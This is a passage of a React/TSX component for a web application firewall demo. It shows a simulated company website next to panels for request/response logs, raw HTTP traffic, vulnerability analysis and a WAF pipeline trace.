  const blockedReqs = logs.filter((l) => l.type === "waf").length;
  const exploitedReqs = logs.filter((l) => l.type === "response" && l.vulnId && l.vulnId !== "custom").length;

  // URL bar path
  const urlPath = sitePage === "home" ? "/" : `/${sitePage === "dashboard" ? "app/dashboard" : sitePage === "api-docs" ? "developers/api" : sitePage}`;

  return (
    <div className="flex flex-col gap-4">
      {/* WAF Status Banner */}
      <div className={cn("flex items-center justify-between gap-4 rounded-xl border-2 px-5 py-3 transition-all duration-500", wafOn ? "border-emerald-500/40 bg-emerald-500/[0.06]" : "border-red-500/40 bg-red-500/[0.06]", attackEffect === "exploit" && "animate-pulse border-red-500 bg-red-500/10 shadow-[0_0_30px_rgba(239,68,68,0.12)]", attackEffect === "blocked" && "animate-pulse border-emerald-500 bg-emerald-500/10 shadow-[0_0_30px_rgba(16,185,129,0.12)]")}>
        <div className="flex items-center gap-3">
          {wafOn ? <ShieldCheck className="size-6 text-emerald-400" /> : <ShieldOff className="size-6 text-red-400" />}
          <div>
            <p className={cn("text-sm font-bold", wafOn ? "text-emerald-400" : "text-red-400")}>
              {wafOn ? "🛡️ WAF ACTIVE — Blocking attacks" : "⚠️ WAF OFF — Site is unprotected"}
            </p>
            <p className="text-[11px] text-muted-foreground">
              {wafOn ? `Monitoring ${enabledVulns.length} vulnerability classes` : "All attacks will succeed and data will be exposed"}
            </p>
          </div>
        </div>
        <div className="flex items-center gap-4 text-xs">
          <div className="text-center"><p className="font-mono font-bold text-foreground">{totalReqs}</p><p className="text-[9px] text-muted-foreground">Requests</p></div>
          <div className="text-center"><p className="font-mono font-bold text-emerald-400">{blockedReqs}</p><p className="text-[9px] text-muted-foreground">Blocked</p></div>
          <div className="text-center"><p className="font-mono font-bold text-red-400">{exploitedReqs}</p><p className="text-[9px] text-muted-foreground">Exploited</p></div>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-4 xl:grid-cols-12">
        {/* ═══ LEFT: Simulated Website ═══ */}
        <div className="xl:col-span-5">
          <div className="wg-panel overflow-hidden p-0 shadow-lg">
            {/* Browser Chrome */}
            <div className="flex items-center gap-2 border-b border-border/40 bg-muted/50 px-3 py-2">
              <div className="flex items-center gap-1.5">
                <span className="size-2.5 rounded-full bg-red-500/80" />
                <span className="size-2.5 rounded-full bg-amber-500/80" />
                <span className="size-2.5 rounded-full bg-emerald-500/80" />
              </div>
              <div className="flex flex-1 items-center gap-1.5 rounded-lg border border-border/40 bg-background/80 px-2.5 py-1">
                <Lock className="size-3 text-emerald-400" />
                <span className="flex-1 truncate font-mono text-[10px] text-muted-foreground">
                  https://acme-corp.com{urlPath}
                </span>
                {wafOn ? <Shield className="size-3 text-emerald-400" /> : <ShieldOff className="size-3 text-red-400" />}
              </div>
            </div>

            {/* Site Header */}
            <div className="flex items-center justify-between border-b border-border/30 bg-gradient-to-r from-background to-muted/20 px-4 py-2.5">
              <div className="flex items-center gap-2.5">
                <div className="flex size-7 items-center justify-center rounded-lg bg-cyan-500/10 text-sm">🏢</div>
                <span className="text-xs font-bold text-foreground">Acme Corp</span>
              </div>
              <div className="flex items-center gap-3">
                {siteUser ? (
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-muted-foreground">{siteUser.name}</span>
                    <div className="flex size-6 items-center justify-center rounded-full bg-cyan-500/20 text-[9px] font-bold text-cyan-400">{siteUser.avatar}</div>
                    <button onClick={handleLogout} className="text-muted-foreground hover:text-red-400"><LogOut className="size-3.5" /></button>
                  </div>
                ) : (
                  <button onClick={() => navigateTo("login")} className="rounded-lg bg-cyan-500/10 px-2.5 py-1 text-[10px] font-semibold text-cyan-400 transition hover:bg-cyan-500/20">Sign In</button>
                )}
              </div>
            </div>

            {/* Site Sidebar Nav */}
            <div className="flex border-b border-border/30 bg-muted/10">
              <div className="flex flex-1 overflow-x-auto">
                {([
                  { page: "home" as SitePage, label: "Home", icon: <Home className="size-3" /> },
                  ...(siteUser ? [
                    { page: "dashboard" as SitePage, label: "Dashboard", icon: <LayoutDashboard className="size-3" /> },
                    { page: "settings" as SitePage, label: "Settings", icon: <Settings className="size-3" /> },
                  ] : []),
                  { page: "search" as SitePage, label: "Search", icon: <Search className="size-3" /> },
                  { page: "contact" as SitePage, label: "Contact", icon: <Mail className="size-3" /> },
                  { page: "api-docs" as SitePage, label: "API", icon: <Terminal className="size-3" /> },
                ]).map((n) => (
                  <button key={n.page} onClick={() => navigateTo(n.page)} className={cn("flex shrink-0 items-center gap-1 border-b-2 px-3 py-2 text-[10px] font-semibold transition-colors", sitePage === n.page ? "border-cyan-400 text-cyan-400" : "border-transparent text-muted-foreground hover:text-foreground/80")}>
                    {n.icon}
                    {n.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Site Alert Banner */}
            {siteAlert && (
              <div className={cn("flex items-start gap-2 border-b px-4 py-2.5 text-[10px]", siteAlert.type === "error" ? "border-red-500/20 bg-red-500/5 text-red-400" : siteAlert.type === "success" ? "border-emerald-500/20 bg-emerald-500/5 text-emerald-400" : "border-amber-500/20 bg-amber-500/5 text-amber-400")}>
                <span className="mt-0.5">{siteAlert.type === "error" ? "⚠️" : siteAlert.type === "success" ? "✅" : "🛡️"}</span>
                <div className="flex-1">
                  <p className="font-semibold">{siteAlert.title}</p>
                  <p className="mt-0.5 text-muted-foreground">{siteAlert.detail}</p>
                </div>
                <button onClick={() => setSiteAlert(null)} className="shrink-0 text-muted-foreground hover:text-foreground"><X className="size-3" /></button>
              </div>
            )}

            {/* Site Content — Page Router */}
            <div className={cn("min-h-[440px] bg-background p-4 transition-all duration-200", attackEffect === "exploit" && "bg-red-500/[0.02]", attackEffect === "blocked" && "bg-emerald-500/[0.02]")}>
              {navigating ? (
                <div className="flex items-center justify-center py-20">
                  <span className="size-5 animate-spin rounded-full border-2 border-cyan-400/30 border-t-cyan-400" />
                </div>
              ) : (
                <>
                  {sitePage === "home" && <SiteHome onNavigate={navigateTo} enabledVulns={enabledVulns} />}
                  {sitePage === "login" && <SiteLogin onNavigate={navigateTo} onLogin={handleLogin} enabledVulns={enabledVulns} siteAlert={siteAlert} />}
                  {sitePage === "register" && <SiteLogin onNavigate={navigateTo} onLogin={handleLogin} enabledVulns={enabledVulns} siteAlert={siteAlert} />}
                  {sitePage === "dashboard" && siteUser && <SiteDashboard user={siteUser} onNavigate={navigateTo} />}
                  {sitePage === "search" && <SiteSearch enabledVulns={enabledVulns} onAttack={handleAttack} />}
                  {sitePage === "contact" && <SiteContact enabledVulns={enabledVulns} onAttack={handleAttack} />}
                  {sitePage === "settings" && siteUser && <SiteSettings user={siteUser} enabledVulns={enabledVulns} onAttack={handleAttack} />}
                  {sitePage === "profile" && siteUser && <SiteProfile user={siteUser} />}
                  {sitePage === "api-docs" && <SiteApiDocs enabledVulns={enabledVulns} onAttack={handleAttack} />}
                  {!siteUser && sitePage === "dashboard" && <SiteLogin onNavigate={navigateTo} onLogin={handleLogin} enabledVulns={enabledVulns} siteAlert={null} />}
                  {!siteUser && sitePage === "settings" && <SiteLogin onNavigate={navigateTo} onLogin={handleLogin} enabledVulns={enabledVulns} siteAlert={null} />}
                </>
              )}
            </div>

            {/* Site Footer */}
            <div className="border-t border-border/30 bg-muted/15 px-4 py-2 text-center text-[8px] text-muted-foreground/60">
              © 2024 Acme Corp · Apache/2.4.52 PHP/8.1.2 · {wafOn ? <span className="text-emerald-400">Secured by WebGuard</span> : <span className="text-red-400">No WAF protection</span>}
            </div>
          </div>
        </div>

        {/* ═══ RIGHT: Traffic & Analysis Panel ═══ */}
        <div className="flex flex-col gap-3 xl:col-span-7">
          {/* Tab Bar */}
          <div className="flex items-center gap-2">
            {([
              { id: "visual" as const, label: "Traffic", icon: <Globe2 className="size-3" /> },
              { id: "http" as const, label: "HTTP Raw", icon: <Terminal className="size-3" /> },
              { id: "analysis" as const, label: "Analysis", icon: <Bug className="size-3" /> },
            ]).map((t) => (
              <button key={t.id} onClick={() => setResponseTab(t.id)} className={cn("flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-[11px] font-semibold transition-colors", responseTab === t.id ? "border-cyan-500/40 bg-cyan-500/10 text-cyan-400" : "border-border/40 text-muted-foreground hover:text-foreground/80")}>
                {t.icon} {t.label}
              </button>
            ))}
            <div className="ml-auto flex items-center gap-2">
              <span className="font-mono text-[9px] text-muted-foreground">{logs.length / 2} exchanges</span>
              <Button variant="ghost" size="sm" className="h-6 gap-1 text-[9px] text-muted-foreground" onClick={() => { setLogs([]); setLastResult(null); }}><RefreshCw className="size-2.5" /> Clear</Button>
            </div>
          </div>

          {/* Visual Traffic Panel */}
          {responseTab === "visual" && (
            <div className="wg-panel flex min-h-[440px] max-h-[640px] flex-col overflow-hidden p-0">
              <div className="flex items-center justify-between border-b border-border/40 bg-muted/30 px-4 py-2">
                <p className="flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">
                  <Globe2 className="size-3 text-cyan-400" /> Request / Response Log
                </p>
              </div>
              <div className="flex-1 overflow-y-auto p-3">
                {logs.length === 0 ? (
                  <div className="flex flex-col items-center gap-3 py-16 text-center">
                    <Globe2 className="size-10 text-muted-foreground/20" />
                    <div>
                      <p className="text-sm font-medium text-muted-foreground">No traffic yet</p>
                      <p className="mt-1 max-w-xs text-[10px] text-muted-foreground/60">Navigate the site and trigger attacks. Traffic appears here in real-time.</p>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {logs.map((log) => (
                      <div key={log.id} className={cn("rounded-xl border px-3 py-2.5", log.type === "request" ? "border-cyan-500/20 bg-cyan-500/[0.03]" : log.type === "waf" ? "border-emerald-500/30 bg-emerald-500/[0.04]" : "border-red-500/20 bg-red-500/[0.03]")}>
                        {/* Header */}
                        <div className="flex items-center gap-2 mb-1.5">
                          {log.type === "request" && <span className="text-[8px] font-bold text-cyan-400">→ REQ</span>}
                          {log.type === "waf" && <span className="text-[8px] font-bold text-emerald-400">🛡️ WAF</span>}
                          {log.type === "response" && <span className="text-[8px] font-bold text-red-400">← RES</span>}
                          {log.method && <span className={cn("rounded px-1 py-0.5 text-[7px] font-bold", log.method === "GET" ? "bg-emerald-500/15 text-emerald-400" : "bg-amber-500/15 text-amber-400")}>{log.method}</span>}
                          {log.path && <span className="font-mono text-[9px] text-muted-foreground truncate">{log.path}</span>}
                          {log.status && (
                            <span className={cn("ml-auto rounded px-1.5 py-0.5 text-[7px] font-bold", log.status === 403 ? "bg-emerald-500/15 text-emerald-400" : log.status === 200 ? "bg-red-500/15 text-red-400" : "bg-muted/50 text-muted-foreground")}>
                              {log.status} {log.statusText}
                            </span>
                          )}
                          {log.threatScore !== undefined && <span className={cn("font-mono text-[8px] font-bold", log.threatScore > 70 ? "text-red-400" : log.threatScore > 40 ? "text-amber-400" : "text-emerald-400")}>t:{log.threatScore}</span>}
                        </div>
                        {/* Body */}
                        <pre className="max-h-24 overflow-auto whitespace-pre-wrap font-mono text-[9px] leading-relaxed text-foreground/60">
                          {log.body ? (log.body.length > 300 ? log.body.slice(0, 300) + "\n... (truncated)" : log.body) : ""}
                        </pre>
                        {/* Vuln info */}
                        {log.vulnId && VULN_DEFS[log.vulnId] && (
                          <div className="mt-1.5 flex items-center gap-2 border-t border-border/20 pt-1.5">
                            <span className={cn("rounded-full border px-1.5 py-0.5 text-[7px] font-bold", SEVERITY_META[VULN_DEFS[log.vulnId].severity].badge)}>
                              {SEVERITY_META[VULN_DEFS[log.vulnId].severity].label}
                            </span>
                            <span className="text-[8px] text-muted-foreground">{VULN_DEFS[log.vulnId].cwe}</span>
                            <span className="text-[8px] text-muted-foreground">{VULN_DEFS[log.vulnId].owasp}</span>
                          </div>
                        )}
                        {/* Virtual patch info for WAF blocks */}
                        {log.type === "waf" && log.vulnId && VULN_DEFS[log.vulnId] && (
                          <div className="mt-1.5 rounded-lg border border-emerald-500/20 bg-emerald-500/[0.03] p-2">
                            <p className="text-[8px] font-bold text-emerald-400">Virtual Patch</p>
                            <p className="mt-0.5 text-[9px] text-muted-foreground">{VULN_DEFS[log.vulnId].wafPatch}</p>
                          </div>
                        )}
                        {/* Exploit impact */}
                        {log.type === "response" && log.vulnId && !log.blocked && VULN_DEFS[log.vulnId] && (
                          <div className="mt-1.5 rounded-lg border border-red-500/20 bg-red-500/[0.03] p-2">
                            <p className="text-[8px] font-bold text-red-400">⚠ Impact</p>
                            <p className="mt-0.5 text-[9px] text-muted-foreground">{VULN_DEFS[log.vulnId].impact}</p>
                          </div>
                        )}
                      </div>
                    ))}
                    <div ref={logsEndRef} />
                  </div>
                )}
              </div>
            </div>
          )}

          {/* HTTP Raw Panel */}
          {responseTab === "http" && (
            <div className="wg-panel flex min-h-[440px] max-h-[640px] flex-col overflow-hidden p-0">
              <div className="border-b border-border/40 bg-muted/30 px-4 py-2">
                <p className="flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">
                  <Terminal className="size-3 text-cyan-400" /> Raw HTTP Traffic
                </p>
              </div>
              <div className="flex-1 overflow-y-auto bg-[#0a0e18] p-4">
                <pre className="font-mono text-[9px] leading-relaxed text-foreground/50">
                  {logs.length === 0 ? (
                    <span className="text-foreground/20"># Waiting for traffic...</span>
                  ) : logs.map((log) => (
                    <div key={log.id} className="mb-4">
                      <span className="text-foreground/20">─── {new Date(log.ts).toLocaleTimeString()} ───</span>{"\n"}
                      {log.type === "request" && (
                        <>
                          <span className="text-cyan-400">→ {log.method} {log.path} HTTP/1.1</span>{"\n"}
                          <span className="text-cyan-400">Host:</span> vulnerable-app.local{"\n"}
                          <span className="text-cyan-400">Content-Type:</span> application/x-www-form-urlencoded{"\n\n"}
                          <span className="text-emerald-400">{log.body}</span>
                        </>
                      )}
                      {log.type === "waf" && (
                        <>
                          <span className="text-emerald-400">← HTTP/1.1 403 Forbidden</span>{"\n"}
                          <span className="text-emerald-400">X-WebGuard-Rule:</span> {log.vulnId ?? "CUSTOM"}{"\n"}
                          <span className="text-emerald-400">X-WebGuard-Action:</span> blocked{"\n\n"}
                          <span className="text-emerald-400">{log.body?.slice(0, 200)}</span>
                        </>
                      )}
                      {log.type === "response" && (
                        <>
                          <span className="text-red-400">← HTTP/1.1 {log.status} {log.statusText}</span>{"\n"}
                          <span className="text-amber-400">Content-Type:</span> text/html{"\n\n"}
                          <span className="text-red-400">{log.body?.slice(0, 200)}</span>
                        </>
                      )}
                      {"\n\n"}
                    </div>
                  ))}
                </pre>
              </div>
            </div>
          )}

          {/* Analysis Panel */}
          {responseTab === "analysis" && (
            <div className="wg-panel flex min-h-[440px] max-h-[640px] flex-col overflow-hidden p-0">
              <div className="border-b border-border/40 bg-muted/30 px-4 py-2">
                <p className="flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">
                  <Bug className="size-3 text-red-400" /> Attack Analysis
                </p>
              </div>
              <div className="flex-1 overflow-y-auto p-4">
                {!lastResult ? (
                  <div className="flex flex-col items-center gap-3 py-16 text-center">
                    <Bug className="size-10 text-muted-foreground/20" />
                    <p className="text-sm text-muted-foreground">No attack data yet</p>
                    <p className="max-w-xs text-[10px] text-muted-foreground/60">Trigger an attack from the simulated website to see the analysis here.</p>
                  </div>
                ) : (
                  <div className="space-y-4">
                    {/* Verdict */}
                    <div className={cn("rounded-xl border-2 p-4", lastResult.blocked ? "border-emerald-500/40 bg-emerald-500/[0.04]" : "border-red-500/40 bg-red-500/[0.04]")}>
                      <div className="flex items-center gap-3">
                        {lastResult.blocked ? <ShieldCheck className="size-8 text-emerald-400" /> : <ShieldOff className="size-8 text-red-400" />}
                        <div>
                          <p className={cn("text-sm font-bold", lastResult.blocked ? "text-emerald-400" : "text-red-400")}>
                            {lastResult.blocked ? "🛡️ Attack Intercepted & Blocked" : "⚠️ Vulnerability Exploited Successfully"}
                          </p>
                          <p className="text-xs text-muted-foreground">
                            {lastResult.vulnId ? VULN_DEFS[lastResult.vulnId]?.label ?? "Unknown" : "Benign request"}
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Threat Score */}
                    {lastResult.threatScore !== undefined && (
                      <div className="rounded-xl border border-border/40 bg-muted/20 p-4">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">Threat Score</span>
                          <span className={cn("font-mono text-2xl font-bold", lastResult.threatScore > 70 ? "text-red-400" : lastResult.threatScore > 40 ? "text-amber-400" : "text-emerald-400")}>
                            {lastResult.threatScore}<span className="text-xs text-muted-foreground">/100</span>
                          </span>
                        </div>
                        <div className="mt-2 h-2 overflow-hidden rounded-full bg-border/40">
                          <div className={cn("h-full rounded-full transition-all duration-700", lastResult.threatScore > 70 ? "bg-gradient-to-r from-red-500 to-red-400" : lastResult.threatScore > 40 ? "bg-gradient-to-r from-amber-500 to-yellow-400" : "bg-gradient-to-r from-emerald-500 to-emerald-400")} style={{ width: `${lastResult.threatScore}%` }} />
                        </div>
                      </div>
                    )}

                    {/* Vuln Details */}
                    {lastResult.vulnId && VULN_DEFS[lastResult.vulnId] && (
                      <div className="rounded-xl border border-border/40 bg-muted/20 p-4">
                        <p className="mb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">Vulnerability Details</p>
                        {(() => {
                          const def = VULN_DEFS[lastResult.vulnId!];
                          const sm = SEVERITY_META[def.severity];
                          return (
                            <div className="space-y-2">
                              <div className="flex flex-wrap items-center gap-2">
                                <span className="text-sm font-bold text-foreground">{def.label}</span>
                                <span className={cn("rounded-full border px-2 py-0.5 text-[8px] font-bold", sm.badge)}>{sm.label}</span>
                              </div>
                              <p className="text-[10px] text-muted-foreground">{def.description}</p>
                              <div className="flex flex-wrap gap-3 text-[9px]">
                                <span className="text-muted-foreground"><span className="font-semibold text-foreground/60">CWE:</span> {def.cwe}</span>
                                <span className="text-muted-foreground"><span className="font-semibold text-foreground/60">OWASP:</span> {def.owasp}</span>
                              </div>
                              <div className="rounded-lg border border-red-500/20 bg-red-500/[0.03] p-2.5">
                                <p className="text-[8px] font-bold uppercase tracking-wider text-red-400">Impact</p>
                                <p className="mt-0.5 text-[10px] text-foreground/70">{def.impact}</p>
                              </div>
                              <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/[0.03] p-2.5">
                                <p className="text-[8px] font-bold uppercase tracking-wider text-emerald-400">Virtual Patch</p>
                                <p className="mt-0.5 text-[10px] text-foreground/70">{def.wafPatch}</p>
                              </div>
                            </div>
                          );
                        })()}
                      </div>
                    )}

                    {/* WAF Pipeline Trace */}
                    <div className="rounded-xl border border-border/40 bg-muted/20 p-4">
                      <p className="mb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">WAF Pipeline Trace</p>
                      <div className="space-y-1.5">
                        {[
                          { stage: "1. Ingress", pass: true, detail: "Request received at edge" },
                          { stage: "2. Rate Limit", pass: true, detail: "Within budget" },
                          { stage: "3. Signature Engine", pass: !lastResult.blocked, detail: lastResult.blocked ? `Matched ${lastResult.vulnId}` : "No match — firewall off" },
                          { stage: "4. ML Classifier", pass: !lastResult.blocked, detail: lastResult.blocked ? "High confidence" : "Below threshold" },
                          { stage: "5. Enforcement", pass: !lastResult.blocked, detail: lastResult.blocked ? "Dropped 403" : "Forwarded" },
                          { stage: "6. Origin", pass: true, detail: lastResult.blocked ? "No contact" : `Returned ${lastResult.status}` },
                        ].map((step, i) => (
                          <div key={i} className={cn("flex items-center gap-2 rounded-lg border px-2.5 py-1.5 text-[10px]", !step.pass ? "border-emerald-500/30 bg-emerald-500/[0.03]" : "border-border/20 bg-muted/10")}>
                            <span className={cn("size-4 shrink-0 rounded-full flex items-center justify-center text-[7px] font-bold", !step.pass ? "bg-emerald-500/20 text-emerald-400" : "bg-cyan-500/20 text-cyan-400")}>{!step.pass ? "✕" : "✓"}</span>
                            <span className="min-w-[80px] shrink-0 font-semibold text-foreground/70">{step.stage}</span>
                            <span className="min-w-0 flex-1 text-muted-foreground">{step.detail}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
